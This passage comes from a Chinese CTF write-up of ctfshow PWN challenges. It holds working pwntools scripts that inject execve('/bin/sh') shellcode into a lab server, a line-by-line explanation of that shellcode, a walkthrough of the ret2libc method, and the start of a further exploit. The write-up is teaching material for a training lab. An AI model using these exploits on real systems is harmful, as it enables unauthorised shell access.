</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">F7</span>                 <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">buf</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">FD</span>                 <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; s</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">080484</span><span class="nf">FE</span>                 <span class="nv">call</span>    <span class="nv">_puts</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048503</span>                 <span class="nf">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">10h</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048506</span>                 <span class="nf">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">buf</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0804850</span><span class="nf">C</span>                 <span class="nv">call</span>    <span class="nb">eax</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0804850</span><span class="nf">E</span>                 <span class="nv">nop</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0804850</span><span class="nf">F</span>                 <span class="nv">mov</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048512</span>                 <span class="nf">leave</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048513</span>                 <span class="nf">retn</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048513</span> <span class="c1">; } // starts at 80484C6</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048513</span> <span class="nf">ctfshow</span>         <span class="nv">endp</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048513</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048514</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">08048514</span> <span class="c1">; =============== S U B R O U T I N E =======================================</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这代码是在看不懂可以上AI嗦一下，让它帮你解析一下，毕竟刚入门&hellip;&hellip;（这段代码是 IDA 反编译出的 32 位 x86 架构程序中<code>ctfshow</code>函数）</p>
<p>checksec一下：记住上面的参数，后面写exp要用&hellip;</p>
<p><img src="/p/ctfshow-pwn-writeup/62.png"
	width="675"
	height="180"
	srcset="/p/ctfshow-pwn-writeup/62_hu_384015e3cc48e.png 480w, /p/ctfshow-pwn-writeup/62_hu_8910832fcad885ea.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="375"
		data-flex-basis="900px"
	
></p>
<p>可知，对这些保护有点遗忘的可以回去看<a class="link" href="https://expl0rer.top/p/pwn-1/#linux%e5%ae%89%e5%85%a8%e9%98%b2%e6%8a%a4%e6%9c%ba%e5%88%b6"  target="_blank" rel="noopener"
    >PWN-1的Linux安全保护机制</a></p>
<div class="table-wrapper"><table>
  <thead>
      <tr>
          <th>保护项</th>
          <th>状态</th>
          <th>对利用的影响</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Arch</td>
          <td>i386-32-Little</td>
          <td>32 位 x86 架构，shellcode 需用 32 位版本（对应<code>shellcraft.i386.sh()</code>）</td>
      </tr>
      <tr>
          <td>Canary（栈溢出保护）</td>
          <td>No canary found</td>
          <td>无栈溢出保护，缓冲区溢出后可直接覆盖栈上数据（无需绕过 canary）</td>
      </tr>
      <tr>
          <td>NX（栈不可执行）</td>
          <td>NX disabled</td>
          <td>栈段可执行，shellcode 直接放在栈上就能运行（无需 ROP 绕过 NX）</td>
      </tr>
      <tr>
          <td>PIE（地址随机化）</td>
          <td>No PIE (0x8048000)</td>
          <td>程序地址固定，<code>ctfshow</code>函数、<code>buf</code>缓冲区地址不会变（无需泄露地址）</td>
      </tr>
      <tr>
          <td>RWX segments</td>
          <td>Has RWX segments</td>
          <td>存在 “可读可写可执行” 的内存段，进一步确保 shellcode 能正常执行</td>
      </tr>
  </tbody>
</table></div>
<p><strong>总结</strong>：程序保护机制极弱，直接用 “栈溢出注入 shellcode” 即可，无需复杂绕过。</p>
<p>回到本题目，在nc连接之后交互一会发现并无实际效果，PWN大致思路是找到后门函数或者系统调用函数进行<code>提权</code>，提权之后就进行交互去执行一些靶机的终端命令例如：cat ctfshow_flag、ls之类的。那在此之前都得先找到这“后门”，也就是/bin/sh、zsh、system函数等等，但我发现这个程序并无这些地址存在，所以说这个程序从被制造出来都没想过要执行这些有关提权的代码&hellip;..</p>
<p><img src="/p/ctfshow-pwn-writeup/66.png"
	width="1650"
	height="625"
	srcset="/p/ctfshow-pwn-writeup/66_hu_da2faac4b22ea10b.png 480w, /p/ctfshow-pwn-writeup/66_hu_a3ee0bccff8fa056.png 1024w"
	loading="lazy"
	
		alt="全篇搜索/bin/sh字符串"
	
	
		class="gallery-image" 
		data-flex-grow="264"
		data-flex-basis="633px"
	
></p>
<p>因为NX、canary没开、又有RWX，注入一段我们设计的有关执行/bin/sh的exp还是可以的，大致思路有了，接下来开始执行吧。</p>
<p><strong>围绕 “直接执行 shellcode” 设计方案</strong></p>
<p>可以用pwntools的脚本啊，单纯直接调用函数的，而且pwntools有局限啊，就那用这个pwntools的shellcraft模块生成的shellcode比较晦涩难懂，而且注释放到Kali上比较杂乱，而且没有涉及到汇编语言调用，比较简单我就不用了，我这里手敲shellcode方便大家了解一下底层逻辑：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> <span class="c1"># 导入 pwntools 库</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span> <span class="c1"># 设置日志级别为调试模式</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;) # 本地连接</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.challenge.ctf.show&#34;</span><span class="p">,</span> <span class="mi">28176</span><span class="p">)</span> <span class="c1"># 远程连接</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">mov eax, 0xb      
</span></span></span><span class="line"><span class="cl"><span class="s1">mov ecx, 0       
</span></span></span><span class="line"><span class="cl"><span class="s1">mov edx, 0       
</span></span></span><span class="line"><span class="cl"><span class="s1">push 0x0068732f  
</span></span></span><span class="line"><span class="cl"><span class="s1">push 0x6e69622f   
</span></span></span><span class="line"><span class="cl"><span class="s1">mov ebx, esp    
</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80         
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span><span class="p">)</span> <span class="c1"># 生成一个 Shellcode</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="c1"># 将生成的 Shellcode 发送到目标</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>创建一个python文件，输入这些代码放到终端上运行，记得提前打开另外一个窗口进行nc连接远程靶机。</p>
<p>上面其它的python代码没啥可讲的，这是远程交互的模板代码，直接套就好，我现在重在讲解这个手搓的shellcode，它和shellcraft模块产生的shellcode效果一样的，而且还好看懂：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0xb</span>      <span class="c1">; syscall号：11对应execve</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="mi">0</span>        <span class="c1">; argv参数为NULL</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="mi">0</span>        <span class="c1">; envp参数为NULL</span>
</span></span><span class="line"><span class="cl">    <span class="nf">push</span> <span class="mh">0x0068732f</span>   <span class="c1">; 压栈字符串&#34;/sh\0&#34;（小端序存储）</span>
</span></span><span class="line"><span class="cl">    <span class="nf">push</span> <span class="mh">0x6e69622f</span>   <span class="c1">; 压栈字符串&#34;/bin&#34;（小端序存储）</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>      <span class="c1">; ebx指向栈顶的&#34;/bin/sh&#34;字符串地址</span>
</span></span><span class="line"><span class="cl">    <span class="nf">int</span> <span class="mh">0x80</span>          <span class="c1">; 触发系统调用</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote class="alert alert-note">
    <blockquote>
<p>这 7 行代码通过精准设置寄存器和栈数据，完成了<code>execve</code>系统调用的参数准备，最终实现 “用<code>/bin/sh</code>替换当前进程” 的效果，是 CTF 中获取 shell 的基础手段，逻辑清晰且精简（仅 23 字节）。</p></blockquote></blockquote>
<h4 id="逐行解析手敲shellcode">逐行解析手敲shellcode
</h4><p>思路：注入一段能执行/bin/sh的汇编语言代码</p>
<p>① <code>mov eax, 0xb</code></p>
<ul>
<li><code>eax</code>寄存器在 32 位 Linux 系统调用中专门用于传递 “系统调用号”（告诉内核要执行哪个系统调用）。</li>
<li><code>0xb</code>是十六进制，转换为十进制是<code>11</code>，而<code>11</code>正是<code>execve</code>系统调用对应的编号（内核通过这个值识别要执行<code>execve</code>）。</li>
</ul>
<p>② <code>mov ecx, 0</code></p>
<ul>
<li><code>ecx</code>寄存器用于传递<code>execve</code>的第二个参数<code>argv</code>（参数列表）。</li>
<li>传<code>0</code>（即<code>NULL</code>）表示 “没有参数”，等价于在命令行直接输入<code>/bin/sh</code>（不带任何参数）。</li>
</ul>
<p>③ <code>mov edx, 0</code></p>
<ul>
<li><code>edx</code>寄存器用于传递<code>execve</code>的第三个参数<code>envp</code>（环境变量列表）。</li>
<li>传<code>0</code>（即<code>NULL</code>）表示 “没有环境变量”，内核会使用默认环境变量。</li>
</ul>
<p>④ <code>push 0x0068732f</code></p>
<ul>
<li>
<p><code>push</code>指令将数据压入栈中（栈是向下增长的内存区域）。</p>
</li>
<li>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0068732f</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>是十六进制的 “小端序” 存储（x86 架构默认小端序，即低地址存低位字节），转换为 ASCII 码：</p>
<ul>
<li><code>0x2f</code> → <code>/</code></li>
<li><code>0x73</code> → <code>s</code></li>
<li><code>0x68</code> → <code>h</code></li>
<li><code>0x00</code> → 字符串结束符<code>\0</code>
所以这行实际是往栈上压入字符串<code>&quot;/sh\0&quot;</code>。</li>
</ul>
</li>
</ul>
<p>⑤ <code>push 0x6e69622f</code></p>
<ul>
<li>
<p>同样是压栈操作，<code>0x6e69622f</code>转换为 ASCII 码：</p>
<ul>
<li><code>0x2f</code> → <code>/</code></li>
<li><code>0x62</code> → <code>b</code></li>
<li><code>0x69</code> → <code>i</code></li>
<li><code>0x6e</code> → <code>n</code>
所以这行往栈上压入字符串<code>&quot;/bin&quot;</code>。</li>
</ul>
<p>结合上一行，栈上现在的内容是<code>&quot;/bin/sh\0&quot;</code>（因为栈先压入<code>&quot;/bin&quot;</code>，再压入<code>&quot;/sh\0&quot;</code>，栈顶到栈底的顺序就是<code>/b/i/n//s/h/\0</code>）。</p>
</li>
</ul>
<p>⑥ <code>mov ebx, esp</code></p>
<ul>
<li><code>esp</code>是栈指针寄存器，永远指向当前栈顶的地址。</li>
<li>经过两次<code>push</code>后，栈顶正好是<code>&quot;/bin/sh\0&quot;</code>字符串的起始地址（第一个字符<code>'/'</code>的位置）。</li>
<li>这行指令将栈顶地址存入<code>ebx</code>，而<code>ebx</code>寄存器在<code>execve</code>系统调用中用于传递第一个参数<code>filename</code>（程序路径），所以<code>ebx</code>现在指向我们要执行的<code>&quot;/bin/sh&quot;</code>。</li>
</ul>
<p>⑦ <code>int 0x80</code></p>
<ul>
<li><code>int</code>是中断指令，<code>0x80</code>是 Linux 系统调用的中断号。</li>
<li>执行这条指令会触发一个软中断，让 CPU 从用户态切换到内核态，内核会根据<code>eax</code>中的系统调用号（<code>11</code>）执行<code>execve</code>，并使用<code>ebx</code>、<code>ecx</code>、<code>edx</code>中的参数。</li>
</ul>
<p>总之：必须要定义好这几个寄存器，在最底层操作系统运行时都会用到的，这里不详细讲述，反正你知道这几个寄存器一开始就得这么定义就好啦。（不耐烦了）</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0xb</span>      
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="mi">0</span>       
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="mi">0</span>        
</span></span></code></pre></td></tr></table>
</div>
</div><p>push压栈时要记得字节限制，因为架构是x32，所以push最多4个字节，也就是push两个：/bin、/sh的地址（不满四个字节如/sh要记得用00填满哦不然会报错）</p>
<p>然后就是记得esp寄存器是动态的&hellip;</p>
<p>这是调用pwntools的shellcraft模块的exp：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>  <span class="c1"># 设置日志级别为debug，会输出详细的交互过程</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)  # 本地调试时启用，用于启动本地的pwn程序</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.challenge.ctf.show&#34;</span><span class="p">,</span> <span class="mi">28183</span><span class="p">)</span>  <span class="c1"># 连接远程目标服务，地址为pwn.challenge.ctf.show，端口28183</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>  <span class="c1"># 生成一个执行/bin/sh的shellcode</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>  <span class="c1"># 将shellcode发送给目标服务</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>  <span class="c1"># 进入交互模式，允许用户与目标服务进行交互（如执行命令）</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这是它的shellcode（原版未修改过，直接复制粘贴上来的）：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">        /* execve<span class="o">(</span><span class="nv">path</span><span class="o">=</span><span class="s1">&#39;/bin///sh&#39;</span>, <span class="nv">argv</span><span class="o">=[</span><span class="s1">&#39;sh&#39;</span><span class="o">]</span>, <span class="nv">envp</span><span class="o">=</span>0<span class="o">)</span> */
</span></span><span class="line"><span class="cl">        /* push b<span class="s1">&#39;/bin///sh\x00&#39;</span> */
</span></span><span class="line"><span class="cl">        push 0x68
</span></span><span class="line"><span class="cl">        push 0x732f2f2f
</span></span><span class="line"><span class="cl">        push 0x6e69622f
</span></span><span class="line"><span class="cl">        mov ebx, esp
</span></span><span class="line"><span class="cl">        /* push argument array <span class="o">[</span><span class="s1">&#39;sh\x00&#39;</span><span class="o">]</span> */
</span></span><span class="line"><span class="cl">        /* push <span class="s1">&#39;sh\x00\x00&#39;</span> */
</span></span><span class="line"><span class="cl">        push 0x1010101
</span></span><span class="line"><span class="cl">        xor dword ptr <span class="o">[</span>esp<span class="o">]</span>, 0x1016972
</span></span><span class="line"><span class="cl">        xor ecx, ecx
</span></span><span class="line"><span class="cl">        push ecx /* null terminate */
</span></span><span class="line"><span class="cl">        push <span class="m">4</span>
</span></span><span class="line"><span class="cl">        pop ecx
</span></span><span class="line"><span class="cl">        add ecx, esp
</span></span><span class="line"><span class="cl">        push ecx /* <span class="s1">&#39;sh\x00&#39;</span> */
</span></span><span class="line"><span class="cl">        mov ecx, esp
</span></span><span class="line"><span class="cl">        xor edx, edx
</span></span><span class="line"><span class="cl">        /* call execve<span class="o">()</span> */
</span></span><span class="line"><span class="cl">        push <span class="m">11</span> /* 0xb */
</span></span><span class="line"><span class="cl">        pop eax
</span></span><span class="line"><span class="cl">        int 0x80
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-pwn-writeup/65.png"
	width="1030"
	height="560"
	srcset="/p/ctfshow-pwn-writeup/65_hu_a1098df37bfcfd3b.png 480w, /p/ctfshow-pwn-writeup/65_hu_199a30cfb9c2d5a8.png 1024w"
	loading="lazy"
	
		alt="调用pwntools所产生的shellcode"
	
	
		class="gallery-image" 
		data-flex-grow="183"
		data-flex-basis="441px"
	
></p>
<p>看着确实比较乱&hellip;..😅</p>
<p>最后的最后我想对这题做些评价，其实题不难主要是我初次做，讲得比较啰嗦，如果你会手敲shellcode或者调用pwntools的shellcraft模块的话还是很简单秒掉的。只能怪小生太cai了😄</p>
<p><img src="/p/ctfshow-pwn-writeup/67.png"
	width="856"
	height="304"
	srcset="/p/ctfshow-pwn-writeup/67_hu_12ec48f01ef5c991.png 480w, /p/ctfshow-pwn-writeup/67_hu_825f43a0aef1cbbe.png 1024w"
	loading="lazy"
	
		alt="顺利完成execve系统调用，得以进行交互"
	
	
		class="gallery-image" 
		data-flex-grow="281"
		data-flex-basis="675px"
	
></p>
<p>大致思路知道就好，靶机的flag是动态变化的。</p>
<h3 id="pwn_025待定">PWN_025（待定）
</h3><p>题目：开启NX保护，或许可以试试ret2libc</p>
<p><a class="link" href="PWN_025" >PWN_025</a></p>
<p>根据题目，也就是说具体攻击手法为：<code>ret2libc</code></p>
<p><code>ret2libc</code> 是一种在二进制漏洞利用中的经典技术，全称为 “return - to - libc”，中文可理解为 “返回至 libc 库”，常用于绕过栈不可执行（<code>NX</code>，No - eXecute）保护机制。</p>
<blockquote>
<h4 id="ret2libc实现步骤">ret2libc实现步骤
</h4><ol>
<li><strong>信息泄漏</strong>：通过栈溢出漏洞，结合一些函数（如 <code>write</code> 函数），泄漏出程序中 <code>libc</code> 库函数的真实地址。因为在不同系统中，<code>libc</code> 库加载的基地址是随机的（<code>ASLR</code> 保护机制），但库内函数之间的相对偏移是固定的，所以需要先获取一个已知函数（比如 <code>write</code> ）的真实地址，进而计算出其他函数（如 <code>system</code> ）的地址。</li>
<li><strong>计算关键地址</strong>：根据泄漏出的 <code>libc</code> 函数地址，计算出 <code>system</code> 函数地址和 <code>/bin/sh</code> 字符串在内存中的地址。由于 <code>libc</code> 中函数和字符串的相对位置固定，所以可以通过已知函数地址与偏移量来计算其他关键地址。</li>
<li><strong>构造 payload</strong>：再次利用栈溢出漏洞，构造合适的 payload。payload 一般包含填充数据（用于填满缓冲区直到覆盖返回地址）、<code>system</code> 函数地址（覆盖返回地址，使程序返回时跳转到 <code>system</code> 函数）、一个无效的返回地址（<code>system</code> 函数执行完后要返回的地址，随便填充一个地址，因为获取到 shell 后通常不会再关注这个返回操作 ）、<code>/bin/sh</code> 字符串的地址（作为 <code>system</code> 函数的参数，这样 <code>system</code> 函数执行时就相当于执行了 <code>system(&quot;/bin/sh&quot;)</code> ，从而打开一个 shell ）。</li>
<li><strong>发送 payload</strong>：将构造好的 payload 发送给存在漏洞的程序，使程序按照攻击者期望的流程执行，最终获取到一个交互式 shell，达到漏洞利用的目的。</li>
</ol></blockquote>
<p>checksec一下，发现开了MX保护，也就是说不能用shellcode了。</p>
<p><img src="/p/ctfshow-pwn-writeup/68.png"
	width="746"
	height="164"
	srcset="/p/ctfshow-pwn-writeup/68_hu_a99ea644fc591014.png 480w, /p/ctfshow-pwn-writeup/68_hu_74f646b65d73e4a1.png 1024w"
	loading="lazy"
	
		alt="x32"
	
	
		class="gallery-image" 
		data-flex-grow="454"
		data-flex-basis="1091px"
	
></p>
<p>跟进ctfshow函数：</p>
<p><img src="/p/ctfshow-pwn-writeup/86.png"
	width="716"
	height="251"
	srcset="/p/ctfshow-pwn-writeup/86_hu_ad09145c80ebcfc7.png 480w, /p/ctfshow-pwn-writeup/86_hu_102f231e16202428.png 1024w"
	loading="lazy"
	
		alt="F5反编译查看main代码"
	
	
		class="gallery-image" 
		data-flex-grow="285"
		data-flex-basis="684px"
	
></p>
<p><img src="/p/ctfshow-pwn-writeup/87.png"
	width="670"
	height="225"
	srcset="/p/ctfshow-pwn-writeup/87_hu_4b1328521ea80b77.png 480w, /p/ctfshow-pwn-writeup/87_hu_6142d0f1d51ae79b.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="297"
		data-flex-basis="714px"
	
></p>
<p>可以发现buf大小为 132 字节，但read允许读取 0x100（256）字节存在栈溢出漏洞。</p>
<p>IDAx32分析，也没有/bin/sh、后门system：</p>
<p><img src="/p/ctfshow-pwn-writeup/69.png"
	width="1324"
	height="545"
	srcset="/p/ctfshow-pwn-writeup/69_hu_6b3b5c81b042741f.png 480w, /p/ctfshow-pwn-writeup/69_hu_60765907f2428b45.png 1024w"
	loading="lazy"
	
		alt="无/bin/sh路径"
	
	
		class="gallery-image" 
		data-flex-grow="242"
		data-flex-basis="583px"
	
></p>
<p>这时候就需要使用利用libc（动态链接库）的system函数和/bin/sh字符串（这题思路很类似PWN_024的编写shellcode一样，程序本身没有后门可入只能从外部链接进这些函数，从而达到进入交互&hellip;），这些东西在程序运行时的真实地址计算方法为：<code>@got真实地址 = libc基址 + 偏移</code>，所以要先计算出<strong>偏移</strong>。</p>
<p>以write函数为例 ，偏移 = 真实地址 - libc基址，真实地址存在write@got、write@got可以通过write@plt来运行这个函数从而泄露出来，libc 版本和基址可以导入 libcSearcher 库来查找计算这里需要去系统学习一下动态链接的过程（<a class="link" href="https://expl0rer.top/p/pwn-1/#plt%e4%b8%8egot"  target="_blank" rel="noopener"
    >有关.got、.plt表的知识</a>），简单画个图说明一下黄色部分是静态的，绿色部分是动态变化的：</p>
<p><img src="/p/ctfshow-pwn-writeup/88.png"
	width="742"
	height="207"
	srcset="/p/ctfshow-pwn-writeup/88_hu_f4cd45bfba752e2c.png 480w, /p/ctfshow-pwn-writeup/88_hu_6305d23fee54b4e3.png 1024w"
	loading="lazy"
	
		alt="动态链接库的过程"
	
	
		class="gallery-image" 
		data-flex-grow="358"
		data-flex-basis="860px"
	
></p>
<p>elf.got[&lsquo;write&rsquo;]的作用是获取 write函数真实地址的存储位置，即write@got的地址；</p>
<p>elf.plt[&lsquo;write&rsquo;]的作用是获取 write函数跳板地址的存储位置，即write@plt的地址；</p>
<blockquote>
<p>具体思路：</p>
<ol>
<li>解析目标程序的 ELF 文件，读取write@plt的地址 、write@got的地址和ctfshow的函数地址。</li>
<li>以栈溢出漏洞作为入口，跳转到write@plt执行函数泄露write@got的地址，再跳转回ctfshow函数。</li>
<li>读取泄露出的write@got的地址，用 libcSearcher 库查找正确的 libc 版本，再计算偏移。</li>
<li>计算system函数和/bin/sh字符串的真实地址。</li>
<li>继续从ctfshow函数里的栈溢出作为入口，跳转到system函数真实地址，同时将/bin/sh作为参数传入，从而拿到权限。</li>
</ol></blockquote>
<p>&hellip;.<a class="link" href="https://www.cnblogs.com/Claire-cat/articles/19029030"  target="_blank" rel="noopener"
    >从CTFshow-PWN入门-pwn25分析ret2libc原理与实现 - Claire_cat - 博客园</a></p>
<p>ret2libc攻击（即先找到栈溢出漏洞，通过write函数泄露 write 函数的真实地址，根据泄露的 write 函数地址，使用 LibcSearcher 来搜索 libc 库中相应的函数地址和字符串地址，获取 system 函数和&quot;/bin/sh&quot; 字符串的地址。构造新的 payload，使用泄露的 system 函数和 &ldquo;/bin/sh&rdquo; 字符串的地址来进行get shell）</p>
<p>exp备注版：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>  <span class="c1"># 导入pwntools库，提供漏洞利用常用功能（如连接、打包等）</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>  <span class="c1"># 导入LibcSearcher，用于根据泄露的函数地址查找对应libc版本</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>  <span class="c1"># 设置日志级别为debug，显示详细的交互过程（方便调试）</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 建立与目标服务的连接（远程服务器地址和端口）</span>
